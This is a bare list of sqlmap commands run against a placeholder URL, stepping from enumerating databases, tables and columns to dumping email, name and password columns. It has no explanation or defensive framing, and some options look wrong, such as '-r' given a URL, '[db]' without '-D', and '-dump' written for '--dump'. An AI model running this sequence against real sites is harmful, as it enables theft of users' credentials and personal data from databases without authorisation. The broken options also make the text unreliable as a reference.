sqlmap -h

sqlmap -u http://url.com --time-sec 15

sqlmap -r http://url.com --dbs

sqlmap -u http://url.com [db] --tables

sqlmap -u http://url.com -D [db] -T [table] --columns

sqlmap -u http://url.com -D [db] -T [table] -C email,name,pass -dump
